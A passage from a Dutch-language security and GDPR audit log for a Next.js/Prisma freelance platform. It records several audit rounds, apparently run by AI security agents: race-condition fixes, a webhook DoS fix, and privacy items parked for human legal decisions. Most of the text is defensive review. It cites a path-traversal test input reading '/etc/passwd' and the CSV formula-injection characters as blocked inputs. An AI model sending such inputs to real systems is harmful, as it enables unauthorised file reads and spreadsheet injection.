op ALLE server actions + de cascade-/delta-libs; (3) AVG — anonimisering-volledigheid, dataminimalisatie,
PII-in-logs, CSV-injectie, k-anonimiteit, retentie. Delta-focus sinds de vorige ronde (`d93d4f3..a501cbc9`,
PR's #823–#828). Kader: OWASP Top 10 (A01 Broken Access Control, A04 Insecure Design, A08) + ASVS + AVG art.
5/9/15/17/30/32. Stack: Next.js 15.5.19 (voorbij CVE-2025-29927), Auth.js v5, Prisma.

**Uitkomst:** geen KRITIEK/HOOG in code-fixbaar gebied. De authz-keten (auth→rol→ownership→Zod→actie→audit)
is uniform toegepast; IDOR/cross-tenant/injectie/secrets-oppervlak schoon; anonimisering uitzonderlijk
grondig; k-anonimiteit (≥10) server-side afgedwongen; CSV-formule-injectie overal geneutraliseerd via
`escapeCsvField`. De privacy-HOOG/MIDDEL-bevindingen (#1–#3 hieronder) zijn **mensenwerk** (juridische
retentie-vs-erasure-afweging + retentie-termijnbeslissingen) en horaal geparkeerd, niet unilateraal door
een agent op te lossen.

### OPGELOST deze ronde

- **[LAAG · OWASP A04 Insecure Design · state-integriteit/defense-in-depth]** `src/app/(protected)/facturen/actions.ts`
  (`sendInvoice`, `markInvoicePaid`, `cancelInvoice`) + `src/app/(protected)/admin/no-shows/actions.ts`
  (`judgeNoShowReport`) — **TOCTOU op de legacy status-writes: lezen-transitiecheck-schrijven zonder
  compound statusguard.** De transitie werd gevalideerd tegen de vóór-lees; de write gebeurde met een kaal
  `prisma.<model>.update({ where: { id } })`. **Repro:** de eigenaar (of twee admins bij de no-show) dient
  dezelfde actie tweemaal gelijktijdig in (dubbelklik/parallelle tab); beide reads zien `status: SENT`
  resp. `verdict: PENDING`, beide passeren `assertInvoiceTransition`/de "al beoordeeld?"-check, beide
  writes committen → **dubbele INVOICE_SENT/PAID/CANCELLED-notificatie + auditregel**, en bij de no-show kon
  een tweede, afwijkend oordeel (JUSTIFIED vs UNJUSTIFIED) het eerste overschrijven mét dubbele audit +
  notificatie. Geen cross-user-impact (ownership/rol eerst gecheckt), geen geldcorruptie, maar wél een
  audit-/notificatie-integriteitslek dat de cascade-laag (`commands-shared.ts`) al lang met een
  `updateMany`-statusguard afdekt; de legacy-paden waren de inconsistentie. **Geschonden regel:** CLAUDE.md
  architectuurregel 3 (statusovergangen deterministisch/atomair) + regel 5 (auditcorrectheid). **Fix
  (`d93d4f3..HEAD`):** alle vier de writes omgezet naar een interactieve `prisma.$transaction(async (tx) =>
…)` met `tx.<model>.updateMany({ where: { id, status: <from> } | { id, verdict: "PENDING" }, data })`;
  bij `count === 0` (status matchte niet meer → race verloren) blijven de neveneffecten uit — idempotent
  voor de factuurpaden, nette domeinfout ("Deze melding is al beoordeeld.") + rollback voor de no-show.
  Spiegelt de in-transactie-guard van de cascade-laag. Rood→groen:
  `src/app/(protected)/facturen/actions.test.ts` (5 tests) + `src/app/(protected)/admin/no-shows/actions.test.ts`
  (2 tests): guard-`where` bevat de from-status; count 1 → precies één notificatie/auditregel; count 0 →
  geen dubbel effect.

### Geparkeerd deze ronde — MENSENWERK (juridische/ops-beslissing vereist, niet unilateraal door een agent)

- **[HOOG · AVG art. 17 (recht op vergetelheid) + art. 9 (bijzondere categorie)]** `src/app/(protected)/admin/gebruikers/actions.ts`
  (`anonymizeUser`) — de anonimisering is uitzonderlijk grondig (User/Profile/Company/Documents+bestanden/
  Credentials/Messages/Notifications/Applications/Reviews/DomainEvent-payloads/AuditLog-metadata, incl. drie
  kopieën van een dispuutreden), maar laat bewust **twee categorieën door-een-derde-geschreven PII óver de
  betrokkene** staan: `NoShowReport.reason` (`prisma/schema.prisma:772`) en `Performance.rejectionReason`.
  `NoShowReport.reason` kan een **gezondheids-/arbeidsongeschiktheidsdetail** bevatten (art. 9). **Repro:**
  anonimiseer een ZZP'er met een ongegronde no-show-melding of een afgewezen prestatie → de vrije tekst die
  de tegenpartij over hem schreef blijft leesbaar in de DB. **Spanning:** art. 17-erasure vs. legitiem
  bewaarbelang (dispuut-/geschilbewijs). **Aanbevolen fix (na FG/juridische sign-off):** óf redact deze twee
  velden bij erasure van de betrokken ZZP'er (spiegel het bestaande patroon), óf leg een expliciete,
  gedocumenteerde retentie-uitzondering met art. 9-vlag vast in `lib/compliance/processing-register.ts`.
  **Een agent mag door-derden-geschreven bewijstekst niet stilzwijgend redacten zonder juridisch besluit.**
- **[MIDDEL · AVG art. 5(1)(e) opslagbeperking]** `src/lib/compliance/processing-register.ts` vs.
  `src/app/api/tasks/run-all/route.ts` — het verwerkingsregister claimt bewaartermijnen (Berichten = 12 mnd
  na samenwerking-einde; Reacties/sollicitaties = 4 wkn na selectie), maar er draaien **alleen**
  `audit-retention` + `webhook-event-retention` als retentie-taken; **geen** snoei-/anonimiseer-taak voor oude
  `Message`/`Application`-rijen. Bovendien is `audit-retention` **default UIT** (`AUDIT_LOG_RETENTION_DAYS`
  unset/0 = no-op; `src/lib/audit-retention-task.ts`), dus auditlogs (met IP/user-agent) worden onbeperkt
  bewaard tenzij een mens 'm inschakelt (wel zichtbaar op `/admin/systeemstatus`). Register = juist als
  _beleid_, niet als _implementatie_ — een toezichthouder zou het mismatch-en. **Aanbevolen fix:** bouw de
  ontbrekende message/application-retentie-taken + registreer ze in `run-all`, óf pas de geclaimde termijnen
  aan tot ze bestaan; en zet `AUDIT_LOG_RETENTION_DAYS` in productie (retentie-lengte = mensenwerk).
- **[MIDDEL · AVG art. 5/17]** `prisma/schema.prisma:217-251` (`Lead.contactName/email/phone`,
  `LeadContact.body`) — derde-partij-PII van **prospects zonder platform-account** heeft alleen een handmatig
  `deleteLead`-pad, geen geautomatiseerde 12-maands-purge (register `processing-register.ts:434-435` erkent dit
  al als geaccepteerde beperking). Deze betrokkenen hebben geen self-service inzage/erasure-route. **Aanbevolen
  fix:** geautomatiseerde lead-retentie-purge; pré-golive herbevestigen met echte prospect-data.

### Herbevestigd schoon deze ronde (geen nieuwe gaten)

- **API-routes (`src/app/api/**`):** elke gevoelige route volgt auth→rol→ownership→audit; IDOR op factuur-/
prestatie-/dossier-/document-PDF's afgedekt (ownership tegen issuer/counterparty/company/freelancer of
ADMIN, deny+success beide ge-audit); alle 18 `tasks/\*\*`-cron-routes achter `CRON_SECRET`(timing-safe,
503 zonder secret);`media/[...key]`alleen bekende`Company.logoKey` + path-traversal-guard in storage;
  push/subscribe SSRF-allowlist; geen stacktrace/Prisma-fout naar de client; rate-limiting op elke
  PDF/document/export/webhook/feed-route.
- **Server actions + cascade:** geen ontbrekende authz-schakel, geen cross-tenant escalatie (tenancy-helpers
  uniform toegepast, 404-parity tegen existence-oracle), geen mass-assignment (role/status/tenantId/verifiedAt
  altijd server-berekend), verboden transities geweigerd via expliciete maps, cascade-geld/status her-toetst
  dispuut/terminale staat _binnen_ de transactie.
- **Privacy:** k-anonimiteit `MARKET_RATE_MIN_SAMPLE=10` server-side afgedwongen + getest; account-export art.
  15/20 met smalle `select`s; CSV-formule-injectie geneutraliseerd (`=`,`+`,`-`,`@`,tab,CR); geen PII in logs
  (noop-mailer + `logStorageCleanupFailure`/`logMailFailure`); enige `dangerouslySetInnerHTML` = nonce-gated
  statisch theme-script; kandidaten-view lekt geen e-mail/telefoon vóór match; publieke vertrouwens-share
  token-gated + PUBLIC/VERIFIED-only + liveness/anonymisatie/tenant-check + ge-audit.
- `npm audit --omit=dev` = **0** productie-kwetsbaarheden (2 dev-only js-yaml DoS resteren, geen prod-oppervlak).

## Ronde 2026-07-18 (2e — basis: `main` @ d93d4f3)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken, met focus op de delta sinds de vorige ronde (`fd1ac99..d93d4f3`, PR's #815–#822): (1)
geld-/cascade-/betaal-flow — `api/billing/webhook`, `lib/billing/*`, `lib/cascade/*`, `lib/cancellation.ts`,
`lib/replacement.ts`; (2) object-/functie-authz + IDOR + cross-tenant op ALLE server actions/route-handlers
(behalve billing/cascade); (3) AVG — anonimisering-volledigheid, dataminimalisatie, PII-in-logs, CSV-injectie,
k-anonimiteit, plus de nieuwe `message-reply-latency.ts`/`application-job-availability.ts`. Kader: OWASP Top 10
(A01/A04/A08) + ASVS + AVG art. 5/9/15/17/30/32. Stack: Next.js 15.5.19 (voorbij CVE-2025-29927), Auth.js v5,
Prisma. `npm audit --omit=dev` = **0** kwetsbaarheden.

### OPGELOST deze ronde

- **[MIDDEL · OWASP A04 Insecure Design · geld-/statuscorrectheid]** `src/lib/cascade/commands-shared.ts`
  — **dispuut-bevriezing was TOCTOU-lek over ALLE cascade-geld-commands.** `assertNotDisputed(collaborationId)`
  is een pre-transactionele lees; de effect-write gebeurt daarná in een aparte `prisma.$transaction`, en noch
  `persistInTransaction` noch `applyCascadeEffects` her-toetste `collaboration.disputedAt` binnen die transactie.
  **Repro:** partij A roept `confirmPayment(invoiceId)` aan → `assertNotDisputed` leest `disputedAt: null` en
  keert terug; concurrent opent partij B `openDispute(collaborationId)` dat éérst commit (`disputedAt` gezet);
  A's effect-transactie commit alsnog → factuur PAID en/of samenwerking auto-afgerond terwijl er nu een open
  dispuut is. De cascade-bevriezing ("de cascade bevriest zolang er een open dispuut is") werd zo omzeild —
  een geld-/statusinconsistentie, geen UX-ordening. Gold voor `confirmPayment`, `submit/approve/autoApprove/
reject`-prestatie en `submit/approve/reject/credit`-factuur (9 command-paden). **Fix (`fd1ac99..HEAD`):** een
  optionele `disputeGuardCollaborationId` op `persistEventAndEffects`; wanneer gezet her-verifieert de effect-
  transactie **binnen** `prisma.$transaction`, vóór er iets wordt weggeschreven, dat `disputedAt` nog null is —
  anders `CascadeError` en de hele transactie rolt terug (geen effect). Spiegelt de in-transactie-herverificatie
  in `samenwerkingen/actions.ts`. Rood→groen: `src/lib/cascade/dispute-freeze-race.test.ts` (3 tests: bevriest
  binnen de tx, laat door zonder dispuut, achterwaarts compatibel zonder guard). Alle 9 command-call-sites geven
  nu de guard-id mee.

### Geparkeerd deze ronde (repro + severity + aanbevolen fix)

- **[LAAG · OWASP A04]** `src/lib/cascade/dispute-commands.ts:30-95,98-151` — `openDispute`/`resolveDispute`
  lezen-dan-schrijven zonder statusguard: de `collaboration.update` binnen de transactie is onvoorwaardelijk
  (geen `where: { disputedAt: null }`). Twee gelijktijdige `openDispute`-calls van beide partijen kunnen beide
  door de pre-check en beide committen → dubbele `DomainEvent`/audit/admin-notificatie (spam), **geen** geldimpact
  (`disputedAt` convergeert naar "gezet"). Fix: hergebruik het `updateMany`-met-guard-patroon uit `apply.ts`.
- **[LAAG · defense-in-depth]** `prisma/schema.prisma` `Subscription.providerRef` heeft geen `@unique`;
  `api/billing/webhook/route.ts` gebruikt `findFirst({ where: { providerRef } })`. Nu niet exploiteerbaar
  (providerRef alleen door de provider gezet, 1 rij per user), maar een toekomstig pad kan stil een collision
  maken. Fix: `@@unique([providerRef])` (nullable-safe) of minimaal `@@index([providerRef])`.
- **[LAAG · UX, geen security]** `src/middleware.ts` bouwt een `callbackUrl` die `login/actions.ts` nooit leest
  (hardcoded `redirectTo: "/dashboard"`). Geen open-redirect (waarde wordt nooit als redirect-target gebruikt),
  wél een verloren post-login-bestemming. Fix bij de volgende auth-touch: valideer callbackUrl als **relatief
  pad** (begint met `/`, geen `//` of schema) en gebruik 'm anders `/dashboard`.
- **[LAAG · dev-only DoS]** `npm audit` meldt 2 kwetsbaarheden (js-yaml quadratic-complexity DoS via merge-keys),
  uitsluitend in **dev-dependencies** (`npm audit --omit=dev` = 0). Geen productie-oppervlak. Fix bij een dev-
  toolchain-update: `npm audit fix`.

### Herbevestigd schoon (geen nieuwe gaten)

- **Betaal-webhook (#816):** Stripe-signatuur timing-safe + fail-closed met replay-tolerantievenster;
  idempotentie-grendel via DB-unieke `(provider, eventKey)`-ledgerrij atomair met de statusmutatie; status-writes
  via de expliciete `SUBSCRIPTION_TRANSITIONS`-map (`CANCELLED→ACTIVE` uitgesloten → geen replay-resurrectie);
  bedrag komt server-side uit `Plan.priceCents`. Nooit een Prisma-fout/stacktrace naar de externe caller.
- **Cascade race-safety (#818/#821):** money-relevante status-writes zijn `updateMany` op de verwachte
  `from`-status + optionele relationele `guard`, `count === 1`-check — double-application/verweesde-factuur
  uitgesloten. Elke command her-verifieert actor-ownership vóór mutatie; bedrag hard-bounded server-side
  (`assertPerformanceWithinLimits`: geen negatief/overflow).
- **Nieuwe read-only signalen (#817/#819):** `message-reply-latency.ts`/`application-job-availability.ts` zijn
  pure functies over al-geautoriseerde, deelnemer-/eigenaar-gescoopte data; geen nieuwe query, geen cross-party-
  PII, alleen geaggregeerde tellingen. Geen mutatie-oppervlak.
- **Authz/IDOR/tenant:** `currentActor()` leest rol/status live uit de DB per request; `/admin`+`/franchise` in
  drie lagen bewaakt; `tenancy.ts` faalt closed; document-serving = owner-of-admin + magic-byte-sniffing +
  fail-closed malware-scan + geaudit; `registerSchema` beperkt self-register-rol tot FREELANCER/CLIENT.
- **AVG:** `anonymizeUser` scrubt User/Profile/Company + ~18 vrije-tekst-tabellen + audit-metadata/IP/UA +
  DomainEvent-payloads en verwijdert Credential/Document-rijen én storage-objecten; CSV via één
  `escapeCsvField`-kern (`= + @ - \t \r` geneutraliseerd); logger redacteert PII-keys + e-mail recursief;
  k-anonimiteit markttarief = 10 (getest, `>= 10`).

### Pre-existing, al-getrackte items (onveranderd — wachten op mens/FG)

- **[LAAG · AVG art. 5]** `berichten/nieuw/page.tsx:70-71` — rauw e-mailadres als naam-fallback in de contactpicker.
- **[HOOG · geëscaleerd naar mens]** `PAYMENT_MIN_SAMPLE_SIZE = 3` (+ gespiegeld in `client-reliability.ts`/
  `client-responsiveness.ts`/`collaboration-quality.ts`) onder de eigen k≥10-markttarief-vloer — business/juridische
  afweging.
- **[HOOG · art. 9-adjacent · geëscaleerd]** `Performance.rejectionReason` (mogelijk gezondheidsgerelateerd)
  overleeft bewust `anonymizeUser` — wacht op menselijke retentie-vs-wissing-beslissing.
- **[LAAG · art. 17]** `Job.title`/`Job.description` overleven `anonymizeUser` — wacht op bewaargrond-beslissing.

## Ronde 2026-07-18 (basis: `main` @ fd1ac99)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) object-/functie-niveau-authz + IDOR op ALLE server actions/route-handlers (samenwerking/
factuur/profiel/document/dossier/bericht/sollicitatie), mass-assignment, status-transitie-omzeiling, CSRF/
open-redirect; (2) AVG — anonimisering-volledigheid, dataminimalisatie/over-fetching, PII-in-logs, CSV-/
formule-injectie in exports, k-anonimiteit, audit-logging van gevoelige acties, derde-partij-PII; (3) upload-
veiligheid (path-traversal/type/grootte/magic-bytes/malware-scan/serving-route), cross-tenant/franchise-
isolatie, SSRF, security-headers/CSP/nonce, auth/sessie (login-timing, reset-token, account-status), foutafhandeling,
`npm audit`. Runtime-basis geseed (`SEED_DEMO=true`, qa.db). Kader: OWASP Top 10 (A01/A02/A03/A04/A05/A07/A09/
A10) + ASVS + AVG art. 5/9/15/17/30/32. Stack: Next.js **15.5.19** (voorbij CVE-2025-29927), Auth.js v5, Prisma;
`npm audit --omit=dev` = **0** kwetsbaarheden over 134 prod-dependencies.

**Delta sinds de vorige ronde (`5b27a92..fd1ac99`, PR's #808–#814):** de nieuwe oppervlakken zijn de cron-
heartbeat/dead-man's-switch (#810), de cashflow-/uitgaven-vooruitblik op `/facturen` (#811/#813) en decoratieve
designconcepten (#812/#814, geen data-/authz-oppervlak). Alle drie afzonderlijk nagelopen:

- **Cron-heartbeat (#810) — schoon.** `POST /api/tasks/run-all` blijft achter `authorizeCron` (timing-safe
  Bearer-vergelijking, `src/lib/cron-auth.ts`; geen `?token=`-queryparam), `recordCronHeartbeat`
  (`src/lib/observability/cron-heartbeat.ts`) schrijft een PII-loze singleton (`name/lastRunAt/lastOk`) en slikt
  eigen fouten — kan de cron-respons nooit omverhalen. Geen nieuw authz-/PII-oppervlak.
- **Cashflow-/uitgaven-vooruitblik (#811/#813) — schoon.** `summarizeCashflowForecast`/`summarizePayablesForecast`
  zijn pure, deterministische functies over de al-geladen (al-geautoriseerde) factuurlijst; geen extra query, geen
  schemawijziging, geen cross-rol/-tenant-data. Server-side waarheid: tonen, nooit beslissen.

### Resultaat: **geen nieuwe security- of privacy-gaten.**

Alle drie de subagents bevestigen de "volwassen, meerdere audit-rondes gehard"-premisse voor hun oppervlak:

- **Authz/IDOR (agent 1):** elke getraceerde mutatie volgt auth→rol→ownership→Zod→actie→audit via
  `requireActor`/`requireRole`/`assertOwnership`; id-gebaseerde reads/mutaties her-scopen op eigenaar/tenant
  (o.a. `/api/documents/[id]` `canAccessDocument`, `/api/facturen/[id]/pdf`, `/api/samenwerkingen/[id]/dossier`,
  de financiële cascade `src/lib/cascade/*`). Verificatiebesluiten via `$transaction`-statusguard
  (`updateMany` op de `from`-status) — race-proof. Enige `dangerouslySetInnerHTML` = het nonce-gepoorte
  thema-script in `layout.tsx` (geen user-input). Geen `$queryRawUnsafe`; geen gecommitte secrets. `callbackUrl`
  wordt genegeerd (hardcoded `redirectTo: "/dashboard"`) — geen open redirect.
- **AVG/privacy (agent 2):** alle 9 CSV-producenten funnelen door de ene `escapeCsvField`/`toCsv`-kern
  (`src/lib/csv.ts`) die `= + @ - \t \r` neutraliseert — geen formule-injectie. `anonymizeUser` scrubt
  User/Profile/Company + ~18 vrije-tekst-tabellen + audit-metadata/IP/UA + DomainEvent-payloads, verwijdert
  Credential/Document-rijen én storage-objecten (28 assertions in `anonymize-erasure.test.ts`). k-anonimiteit
  markttarief = 10, server-afgedwongen. Logger redacteert PII-vormige keys + e-mailadressen recursief. Geen
  over-fetching van PII over rolgrenzen.
- **Upload/SSRF/tenant/headers/auth (agent 3):** `LocalStorageDriver.resolve` weert path-traversal
  (`path.resolve` + prefix, repro `../../etc/passwd` → throw); `generateStorageKey` = UUID + gesanitiseerde
  extensie (nooit client-filename); magic-byte-sniffing + fail-closed malware-scan op alle 3 upload-sites.
  Privé-document-serving = auth→rate-limit→`canAccessDocument`→audit, met `CSP: sandbox`. Tenant-helpers
  (`src/lib/tenancy.ts`) falen closed en lekken geen bestaans-oracle. Geen server-side `fetch()` op user-
  gestuurde URL (DUO/BIG-verify zetten user-input alleen in de POST-body, host uit env). CSP nonce-gebaseerd,
  `frame-ancestors 'none'`. Login timing-safe + reset-token 32-byte CSPRNG/SHA-256/1u/single-use;
  account-status live uit de DB per request. Foutafhandeling striped Prisma-codes/stacktraces. `npm audit` = 0.

### Pre-existing, al-getrackte items (niet nieuw — onafhankelijk herbevestigd deze ronde, wachten op mens/FG)

Deze staan al in eerdere rondes en zijn bewust geparkeerd voor een menselijke beslissing (MENSENWERK §5);
geen agent heeft ze deze ronde unilateraal aangeraakt:

- **[LAAG · AVG art. 5 dataminimalisatie]** `berichten/nieuw/page.tsx:70-71` — rauw e-mailadres als naam-
  fallback in de contactpicker (tenant-gescoopt, geen cross-party-lek). Vervang door niet-PII-placeholder bij
  de volgende touch.
- **[HOOG · geëscaleerd naar mens]** `PAYMENT_MIN_SAMPLE_SIZE = 3` (`payment-behavior.ts:44`) + gespiegelde
  `MIN_SAMPLE_SIZE = 3` in `client-reliability.ts`/`client-responsiveness.ts` — benoemde-partij-reputatiesignalen
  onder de eigen `MARKET_RATE_MIN_SAMPLE = 10`-vloer. Server-afgedwongen, niet te omzeilen; de k=3-vs-k≥10-keuze
  is een business/juridische afweging die op een expliciete menselijke sign-off wacht.
- **[HOOG · art. 9-adjacent · geëscaleerd naar mens]** `Performance.rejectionReason` (client-geschreven,
  mogelijk gezondheidsgerelateerd) overleeft bewust `anonymizeUser` — wacht op menselijke retentie-vs-wissing-
  beslissing (zelfde behandeling als `NoShowReport.reason`).
- **[LAAG · art. 17]** `Job.title`/`Job.description` (client-vrije-tekst) overleeft `anonymizeUser`; geparkeerd
  voor een menselijke bewaargrond-beslissing.

Geen PR met codewijziging deze ronde — de audit vond niets te fixen. Deze docs-update legt de dekking en het
"geen nieuwe gaten"-resultaat vast (AVG art. 5(2) verantwoordingsplicht).

## Ronde 2026-07-17 (2e — basis: `main` @ 5b27a92)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) cross-tenant/franchise-IDOR, (2) AVG-anonimisering/betrokkenenrechten/PII-minimalisatie,
(3) API-route-IDOR/cron-webhook-auth/injectie/push/error-ingest. Runtime-basis geseed (`SEED_DEMO=true`,
qa.db). Kader: OWASP Top 10 (A01/A03/A04/A05/A07/A10) + ASVS + AVG art. 5/9/15/17/30/32. Stack: Next.js
**15.5.19** (voorbij CVE-2025-29927), `npm audit --omit=dev` = **0**.

**Franchise/multi-tenant (agent 1): bevestigd schoon.** Elke mutatie volgt auth→rol→tenant-ownership→Zod→
actie→audit; elke id-gebaseerde read/mutatie her-scoopt op `tenantId` (`assertSameTenant`/`ownsViaTenant`/
`findFirst({id, tenantId})`). Geen IDOR, geen cross-tenant PII-lek, geen `tenantId`-mass-assignment,
`openOverflow` verruimt alleen read-zichtbaarheid (nooit write). Roster-double-booking stript zelfs de
titel van een cross-tenant plaatsing (alleen de telling lekt).

**AVG-anonimisering (agent 2): uitzonderlijk grondig.** `anonymizeUser` scrubt User/Profile/Company-PII,
verwijdert Credential/Document-DB-rijen én de storage-objecten (best-effort, gelogd), cascadeert
CredentialVerification/VerificationRequest, redacteert berichten/notificaties/reviews/dispute-reason
(drievoudig) én **audit-log-PII** (`scrubAuditMetadataPii`). Export (`/api/account/export`) is self-scoped.
k-anonimiteit markttarief = 10. Geen nieuwe blockers.

### Opgelost deze ronde (PR volgt onderaan)

- **[MIDDEL · A05/CWE-400 DoS · OPGELOST]** `src/app/api/billing/webhook/route.ts` — de publieke,
  ongeauthenticeerde webhook las `request.text()` **zonder byte-grens** (alleen per-IP count-rate-limit).
  Een aanvaller kon binnen de count-limit arbitrair grote bodies sturen die eerst volledig in het geheugen
  worden gebufferd (Stripe-handtekening vereist de rauwe body) → geheugen-/CPU-druk. **Fix:** `MAX_BODY_BYTES`
  = 64 KB, geweigerd via de `Content-Length`-header (vóór inlezen) én een lengtecheck ná inlezen — parity met
  `/api/csp-report` (16 KB) + `/api/client-error` (32 KB). Test: `route.test.ts` (3 nieuwe cases).
- **[LAAG · AVG art. 5(2) verantwoordingsplicht / CLAUDE.md regel 5 · OPGELOST]** de vier CSV-exportroutes
  `diensten|verplichtingen|prognose|prestaties/export` schreven — anders dan de administratie-/audit-exports —
  **geen auditregel** bij export van financiële PII (tarieven, tegenpartij, bedragen). **Fix:** elke route
  schrijft nu `{DIENSTEN,OBLIGATIONS,FORECAST,PRESTATIES}_EXPORTED` via `auditData` + `prisma.auditLog.create`.
  Test: `export-audit.test.ts` (4 cases).
- **[LAAG · DOEL 2 robuustheid / A04 · OPGELOST]** `src/app/(protected)/franchise/diensten/actions.ts`
  `setDienstStatus` gebruikte een throwing `jobStatusSchema.parse(target)` op de vóór de `try/catch` — een
  geknutselde POST met een `target` buiten de enum gaf een ongevangen `ZodError` → generieke 500. **Fix:**
  `safeParse` + nette "Ongeldige doelstatus."-afwijzing vóór elke DB-I/O. Test: `set-dienst-status.test.ts`.

### Geparkeerd deze ronde

- **[LAAG · AVG art. 5 dataminimalisatie]** `src/app/(protected)/berichten/nieuw/page.tsx:70-71` — de
  contactpicker toont het rauwe e-mailadres van de ZZP'er als naam-/subtitle-fallback wanneer
  `name`/`headline`/`location` leeg zijn. Correct tenant-gescoopt (FRANCHISER, eigen roster) → geen
  cross-party-lek, maar een niet-PII-fallback (rol/status of "Naam onbekend") volstaat. Repro: FRANCHISER met
  een roster-ZZP'er zonder naam/headline/location → e-mail zichtbaar in de picker. Aanbevolen fix: vervang de
  `?? f.user.email`-fallbacks door een niet-PII-tekst. Niet-blokkerend; meenemen bij de volgende touch.

## Ronde 2026-07-17 (basis: `main` @ f32b9c7)

Audit: orchestrator (Opus 4.8) + 2 parallelle adversariële Opus-security-subagents op de **delta sinds de
vorige ronde** (`3d441cd..f32b9c7` — PR's #796–#800), op de niet-overlappende security-/privacy-relevante
oppervlakken. De 10 nieuwe `concept-3xx.tsx`-designbestanden (#800) zijn puur decoratieve UI (geen data-/
authz-oppervlak) — niet in scope. Kader: OWASP Top 10 (A01 broken access control, A03 injection, A05 misconfig,
A07 auth, A09 logging, A10 SSRF) + ASVS + AVG art. 5/9/15/30/32. Stack-CVE-check: Next.js **15.5.19** (voorbij
CVE-2025-29927 middleware-bypass), `npm audit --omit=dev` = **0**.

**Alle nieuwe oppervlakken bevestigd schoon op authz/tenant/injectie/secrets/SSRF/PII** (geen KRITIEK/HOOG/MIDDEL):

- **Betaalprovider-connectiviteitszelftest (#796)** — `billing-selftest.ts`, `billing/provider.ts` (`checkConnectivity`),
  `admin/systeemstatus/actions.ts` (`runBillingSelfTestAction`), `rate-limit.ts` (`billingSelfTestRateLimiter`),
  `components/admin/billing-selftest.tsx`. **SSRF (A10):** de provider-base-URL's zijn **hardcoded**
  (`https://api.stripe.com/v1`, `https://api.mollie.com/v2`) — geen enkel user-gestuurd URL-veld → geen
  SSRF-oppervlak; `checkConnectivity` doet uitsluitend een READ-ONLY round-trip (Stripe `GET /v1/balance`,
  Mollie `GET /v2/methods`) met vaste methode/pad, `fetchWithTimeout` (`BILLING_HTTP_TIMEOUT_MS`, `AbortController`).
  **Secrets (A05):** `STRIPE_API_KEY`/`MOLLIE_API_KEY` gaan alleen in de `Authorization: Bearer`-header, nooit in
  log/UI/audit/error. **Foutafhandeling (A09):** `BillingConnectivityError` reduceert een HTTP-fout tot provider+
  status; `safeBillingDetail` reduceert elke andere fout tot de error-**naam** — geen endpoint/sleutel/stacktrace.
  **Auth-keten:** `requireRole("ADMIN")` → `billingSelfTestRateLimiter` (6/5min per admin) → actie → audit
  `BILLING_SELFTEST_RUN` logt alleen `{ok, active}` + driver-modus, nooit `detail`/URL/sleutel. Op `noop`
  (demo) is er niets externs — eerlijk als "niets getest" gemeld (geen vals groen). **Geen geldverplaatsing**:
  de zelftest maakt nooit een betaling/checkout aan.
- **Bench-vooruitblik bemiddelaar (#797)** — `franchise/roster-availability-forecast.ts` + wiring in
  `franchise/zzpers/page.tsx`. **Cross-tenant (A01):** beide Prisma-queries scopen op `tenantScopeWhere(actor)`
  (fail-closed 403 zonder tenant); de nieuwe geneste `collaborations`-select hangt aan het al-tenant-gescopete
  `freelancerProfile` en accepteert geen enkele client-id (geen IDOR-oppervlak). De forecast-module is **puur**
  (geen I/O) en draagt alleen aggregaat (`{soon, thisWeek, earliestDays}`) + de eigen `freeDate` — nooit een
  cross-tenant naam/titel/id.
- **Beoordeling-next-action na samenwerking (#799)** — `collaboration-review-prompt.ts` (puur, geen I/O) +
  `pending-tasks.ts`/`tasks.ts`. Alle in-scope paden zijn **read-only** (geen mutatie → geen nieuwe auth-keten
  nodig); `reviewLeaveTasks(userId, role)` scoopt ownership via `{freelancer:{userId}}`/`{company:{userId}}` en
  `userId`/`role` komen altijd uit `requireActor()`/`requireRole()`, nooit uit een request-parameter. PII-select
  minimaal (`job.title`, `company.name`, `freelancer.user.name` + eigen review-existence op `authorId:userId`).
- **Kandidaat-ranking / vergelijk (#798, gemergd onder de titel "cashflow"; zie LAAG-nota)** —
  `candidate-ranking.ts` (puur, geen I/O, geen Prisma) + `kandidaten/vergelijk/page.tsx`. **IDOR (A01):** de
  pagina accepteert **alleen** `?job=<id>`; de kandidatenset komt server-side uit
  `application.findMany({where:{jobId: job.id}})` ná een ownership-gate `job.findFirst({where:{id, company:{userId:actor.id}}})`
  → een opdrachtgever kán geen willekeurige freelancer-id's meegeven om vreemde kandidaten te vergelijken (het
  invoerveld bestaat niet). Downstream-lookups her-scopen defensief (`company:{userId}`, `status:"PUBLISHED"`).
  **PII (AVG art. 5):** select bevat geen e-mail/telefoon/adres/BSN/IBAN; `location` gaat alleen via
  `classifyCandidateProximity` (grove bucket, nooit het rauwe adres); reputatie/kwaliteit pre-geaggregeerd. Geen
  `dangerouslySetInnerHTML`, geen Zod-mutatieschema (read-only).

Broad static sweep over de hele repo: `dangerouslySetInnerHTML` = alleen het genonce'd theme-script; raw SQL =
alleen `SELECT 1`-health-checks (tagged template); geen `.passthrough()` in Zod; geen `NEXT_PUBLIC_*`-secret; geen
`console.*` in de delta; geen `.env`/uploads/`.db` in git.

### Geparkeerd deze ronde

- **[LAAG · traceability / verantwoordingsplicht AVG art. 5(2)]** PR #798 is **gemergd onder de commit-titel**
  "routine: cashflow-samenvatting 'openstaand & onderweg' op /facturen (ZZP'er)", maar de daadwerkelijke squash-diff
  raakt uitsluitend `candidate-ranking.ts` + `kandidaten/vergelijk/page.tsx` — de kandidaat-ranking-feature, niet
  cashflow. De cashflow-/openstaand-panels op `/facturen` (`openstaand-panel.tsx`, `debtor-summary-card.tsx`,
  `prognose-panel.tsx`) bestáán al en dateren van vóór #798; er is niets verdwenen. Het is een **titel-mismatch**
  door parallelle agents die hun WIP samen squashten, geen code-vuln en geen datalek. **Aanbevolen:** bij het
  afronden van de cashflow-backlog-item de PROGRESS.md-regel voor #798 corrigeren zodat de projectadministratie
  klopt (commit-titels zijn geen betrouwbare grondwaarheid voor wat er shipte). Geen fix in deze ronde — puur een
  administratie-nota.
- **[LAAG · dataminimalisatie AVG art. 5(1)(c)]** `kandidaten/vergelijk/page.tsx` selecteert `headline` uit Prisma
  maar rendert/mapt het nergens (dode over-select — bereikt de client niet, dus geen lek). Opruimen bij de volgende
  aanraking van dat bestand.

### Geen nieuwe KRITIEK/HOOG/MIDDEL-bevindingen; geen nieuwe geparkeerde items

De betaalprovider-zelftest hergebruikt het bestaande, al-gepoortte zelftest-patroon (hardcoded base-URL, geen
